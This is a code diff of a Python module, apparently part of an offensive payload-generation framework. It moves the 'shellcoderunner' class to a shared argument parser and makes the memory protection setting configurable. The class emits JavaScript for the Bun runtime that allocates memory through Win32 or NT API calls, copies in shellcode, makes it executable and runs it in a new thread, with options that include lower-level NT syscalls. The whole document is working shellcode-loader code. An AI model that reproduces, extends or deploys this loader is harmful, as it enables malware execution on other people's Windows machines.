@@ -1,60 +1,18 @@
 from string import Template
 import os
+from common.utils.argumentparser import ArgumentParser
 
 class shellcoderunner:
     def __init__(self, arguments):
-        self.memoryPermission = 'PAGE_EXECUTE_READ'
-        if 'perm' in arguments:
-            if arguments['perm'] == 'rwx':
-                self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
-
-        self.allocate = 'VirtualAlloc'
-        if 'allocate' in arguments:
-            if arguments['allocate'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx', 'HeapAlloc']:
-                self.allocate = arguments['allocate']
-            else:
-                print('Allocate argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
-                exit(0)
-
-        self.copy = 'memcpy'
-        if 'copy' in arguments:
-            if arguments['copy'] in ['memcpy', 'NtWriteVirtualMemory', 'WriteProcessMemory']:
-                self.copy = arguments['copy']
-            else:
-                print('Copy argument must be memcpy, WriteProcessMemory, or NtWriteVirtualMemory')
-                exit(0)
-
-        self.protect = 'VirtualProtect'
-        if 'protect' in arguments:
-            if arguments['protect'] in ['VirtualProtect', 'NtProtectVirtualMemory']:
-                self.protect = arguments['protect']
-            else:
-                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
-                exit(0)
-
-        self.execute = 'CreateThread'
-        if 'execute' in arguments:
-            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx', 'CreateRemoteThread']:
-                self.execute = arguments['execute']
-            else:
-                print('Execute argument must be CreateThread, CreateRemoteThread or NtCreateThreadEx')
-                exit(0)
-
-        self.wait = 'WaitForSingleObject'
-        if 'wait' in arguments:
-            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
-                self.wait = arguments['wait']
-            else:
-                print('Wait argument must be WaitForSingleObject or NtWaitForSingleObject')
-                exit(0)
-
-        self.close = 'CloseHandle'
-        if 'close' in arguments:
-            if arguments['close'] in ['CloseHandle', 'NtClose']:
-                self.close = arguments['close']
-            else:
-                print('Close argument must be CloseHandle, or NtClose')
-                exit(0)
+        parser = ArgumentParser(modulename=self.__class__.__name__)
+        parser.add_argument(name='allocate', default='VirtualAlloc', help='Function used for allocating memory', choices={'VirtualAlloc', 'HeapAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx'})
+        parser.add_argument(name='execute', default='CreateThread', help='Function used for executing shellcode', choices={'CreateThread', 'NtCreateThreadEx'})
+        parser.add_argument(name='copy', default='memcpy', help='Function used for copying memory', choices={'memcpy', 'WriteProcessMemory', 'NtWriteVirtualMemory'})
+        parser.add_argument(name='protect', default='VirtualProtect', help='Function used for changing memory protections', choices={'VirtualProtect', 'NtProtectVirtualMemory'})
+        parser.add_argument(name='wait', default='WaitForSingleObject', help='Function used for waiting for execution to finish', choices={'WaitForSingleObject', 'NtWaitForSingleObject'})
+        parser.add_argument(name='close', default='CloseHandle', help='Function used for closing handles after use', choices={'CloseHandle', 'NtClose'})
+        parser.add_argument(name='perm', default='rx', help='Protection of memory when shellcode executes', choices={'rx': 'PAGE_EXECUTE_READ', 'rwx':'PAGE_EXECUTE_READWRITE'})
+        self.args = parser.parse_args(arguments)   
 
     def imports(self) -> list[str]:
         return ['import Kernel32 from "@bun-win32/kernel32";', 
@@ -72,11 +30,11 @@ class shellcoderunner:
     {transformers}
 """
 
-        if self.allocate == 'VirtualAlloc':
+        if self.args['allocate'] == 'VirtualAlloc':
             template += """
     let address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
 """
-        elif self.allocate == 'NtAllocateVirtualMemory':
+        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
             template += """
     let regionSize = new BigUint64Array(1);
     let baseAddress = new BigUint64Array(1);
@@ -84,89 +42,89 @@ class shellcoderunner:
     let status = {NtAllocateVirtualMemory}(-1n, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
     let address = baseAddress[0];
 """
-        elif self.allocate == 'VirtualAllocEx':
+        elif self.args['allocate'] == 'VirtualAllocEx':
             template += """
     let address = {VirtualAllocEx}(-1n, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
 """
-        elif self.allocate == 'HeapAlloc':
+        elif self.args['allocate'] == 'HeapAlloc':
             template += """
     let hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
     let address = {HeapAlloc}(hHeap, HeapAllocFlags.HEAP_ZERO_MEMORY, {shellcodeSize});  
 """
 
-        if self.copy == 'memcpy':
+        if self.args['copy'] == 'memcpy':
             template += """
     let buffer = new Uint8Array(toArrayBuffer(Number(address), 0, {shellcodeSize}));
     buffer.set(shellcode);
 """
-        elif self.copy == 'WriteProcessMemory':
+        elif self.args['copy'] == 'WriteProcessMemory':
             template += """
     let bytesWritten = new BigUint64Array(1);
     {WriteProcessMemory}(-1n, address, ptr(shellcode), {shellcodeSize}n, bytesWritten);
 """
-        elif self.copy == 'NtWriteVirtualMemory':
+        elif self.args['copy'] == 'NtWriteVirtualMemory':
             template += """
     let bytesWritten = new BigUint64Array(1);
     {NtWriteVirtualMemory}(-1n, BigInt(address), ptr(shellcode), {shellcodeSize}n, ptr(bytesWritten));
 """
 
-        if self.protect == 'VirtualProtect':
-            template += """
+        if self.args['protect'] == 'VirtualProtect':
+            template += Template("""
     let oldProtect = new Uint32Array(1);
-    {VirtualProtect}(address, {shellcodeSize}n, MemoryProtection.PAGE_EXECUTE_READ, oldProtect);
-"""     
-        elif self.protect == 'NtProtectVirtualMemory':
+    {VirtualProtect}(address, {shellcodeSize}n, MemoryProtection.$perm, oldProtect);
+""").substitute(perm=self.args['perm'])
+        elif self.args['protect'] == 'NtProtectVirtualMemory':
             template += Template("""
     let oldProtect = new Uint32Array(1);;
     let regionSize_$n = new BigUint64Array(1);
     regionSize_$n[0] = {shellcodeSize}n;
     let baseAddress_$n = new BigUint64Array([BigInt(address)]);
-    {NtProtectVirtualMemory}(-1n, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.PAGE_EXECUTE_READ, ptr(oldProtect));
-""").substitute(n=os.urandom(4).hex())
+    {NtProtectVirtualMemory}(-1n, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.$perm, ptr(oldProtect));
+""").substitute(n=os.urandom(4).hex(), perm=self.args['perm'])
 
-        if self.execute == 'CreateThread':
+        if self.args['execute'] == 'CreateThread':
             template += """
     let hThread = {CreateThread}(null, 0n, address, null, 0, null);
 """
-        elif self.execute == 'NtCreateThreadEx':
+        elif self.args['execute'] == 'NtCreateThreadEx':
             template += """
     let hThreadBuffer = new BigUint64Array(1); 
     {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, 0n, 0, 0n, 0n, 0n, null);
     let hThread = hThreadBuffer[0];
 """
-        elif self.execute == 'CreateRemoteThread':
+        elif self.args['execute'] == 'CreateRemoteThread':
             template += """
     let hThread = {CreateRemoteThread}(-1n, null, 0, address, 0, 0, null);
 """
 
-        if self.wait == 'WaitForSingleObject':
+        if self.args['wait'] == 'WaitForSingleObject':
             template += """
     {WaitForSingleObject}(hThread, 0xFFFFFFFF);
 """
-        elif self.wait == 'NtWaitForSingleObject':
+        elif self.args['wait'] == 'NtWaitForSingleObject':
             template += """
     {NtWaitForSingleObject}(hThread, 0xFFFFFFFF);
 """
 
-        if self.close == 'CloseHandle':
+        if self.args['close'] == 'CloseHandle':
             template += """
     {CloseHandle}(hThread);
 """
-        elif self.close == 'NtClose':
+        elif self.args['close'] == 'NtClose':
             template += """
     {NtClose}(hThread);
 """
 
-        if self.allocate == 'VirtualAlloc':
+        if self.args['allocate'] == 'VirtualAlloc':
             template += """
     {VirtualFree}(address, 0, MemoryAllocationType.MEM_RELEASE) ;
 """
-        elif self.allocate == 'HeapAlloc':
+        elif self.args['allocate'] == 'HeapAlloc':
             template += """
     {HeapFree}(hHeap, 0, address);
     {HeapDestroy}(hHeap);
 """
-        elif self.allocate == 'NtAllocateVirtualMemory':
+        elif self.args['allocate'] == 'NtAllocateVirtualMemory':
             template += """
     {NtFreeVirtualMemory}(-1n, address);
 """
